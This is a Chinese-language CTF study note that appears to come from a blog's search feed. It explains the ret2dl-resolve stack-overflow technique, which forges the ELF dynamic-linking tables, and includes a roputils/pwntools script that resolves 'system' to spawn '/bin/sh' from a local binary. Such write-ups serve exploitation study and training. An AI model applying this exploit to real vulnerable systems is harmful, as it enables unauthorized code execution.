        <content type="html"><![CDATA[<p>挺难的一个知识点，看了两天也只弄懂一点皮毛，感觉还是因为最底层的东西没有弄懂导致理解困难</p><p><strong>使用情景：</strong>libc地址不好泄露，也没有其他的漏洞，但是可以栈溢出</p><p><strong>原理</strong></p><p>首先需要了解ELF文件结构以及动态链接相关知识</p><p>当程序进行动态链接时，为了能够减少资源的浪费动态链接将连接的过程推迟到了运行的时候，当我们第一次调用一个函数的时候，程序会查找需要链接的各种信息，再通过_dl_runtime_resolve这个函数将正确的地址写进got.plt表中，第二次查询的时候就不需要再走一遍这个过程了，直接就可以调用函数（详见参考博客）</p><p>那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。</p><p><strong>动态链接过程</strong></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588207298627/20b1708fb00c75422f0e0de71ca3a50c5804b6d8.png" alt="1"></p><p>而整个dl函数的过程入下图所示：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Ret2dl/1635588245719719/d078ccc1c92f9b6d92cc23e5a1e218e31b7ceef0.png" alt="2"></p><p><strong>整个过程说白了就是：</strong></p><ol><li>先从 .rel.plt 表里找到某个函数在 .dynsym 里的偏移</li><li>再从 .dynsym 符号表里找函数在 .dynstr 表里的偏移</li><li>再从 .dynstr 表里找到具体的函数对应的字符串，然后将这个字符串解析成函数 </li></ol><p> <strong>而我们的攻击方式就是伪造所谓的表，然后将我们伪造表的偏移当参数传入，这样的话，他就会解析到我们想需要的函数了</strong></p><p> <strong>攻击:</strong></p><p>可以看到，整个 dl 函数主要是利用了三个表</p><ul><li>.rel.plt</li><li>.dynsym</li><li>dynstr</li></ul><p>那我们要做的就是伪造这三个表，将我们伪造表的偏移当参数传入，这样它就会解析我们想要的函数了</p><p>当然也可以工具一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context </span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">r.recv() </span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>) </span><br><span class="line">offset = <span class="number">112</span> </span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>) </span><br><span class="line">buf = rop.fill(offset) </span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>) </span><br><span class="line"><span class="comment">## used to call dl_runtimeresolve() </span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base) </span><br><span class="line">r.send(buf) buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf) </span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str </span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>) </span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line"> r.send(buf) </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><p> <strong>参考链接</strong></p><p> <a href="https://blog.csdn.net/qq_41202237/article/details/107378159">https://blog.csdn.net/qq_41202237/article/details/107378159</a></p><p> <a href="https://xz.aliyun.com/t/5122">https://xz.aliyun.com/t/5122</a></p><p> <a href="https://blog.csdn.net/qq_51868336/article/details/114644569">https://blog.csdn.net/qq_51868336/article/details/114644569</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
